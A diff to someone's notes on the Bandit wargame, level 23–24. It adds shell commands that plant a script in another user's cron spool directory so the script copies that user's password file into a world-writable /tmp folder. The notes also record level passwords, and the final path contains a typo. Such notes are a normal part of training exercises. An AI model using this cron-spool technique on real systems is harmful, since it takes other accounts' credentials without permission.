@@ -109,5 +109,17 @@ cat /tmp/8ca319486bfbbc3663ea0fbe81326349
 
 #23
 cat /usr/bin/cronjob_bandit24.sh
+mkdir -p /tmp/snoopy123
+cd /tmp/snoopy123
+echo "cat /etc/bandit_pass/bandit24 > /tmp/snoopy123/pass.txt" > a.sh
+chmod 777 a.sh
+chmod -R 777 /tmp/snoopy123
+cp a.sh /var/spool/bandit24
+#Wait for cron
+cat /tmp/snnopy123/pass.txt
 
 #pwd: jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
+
+#24
+
+#pwd: UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
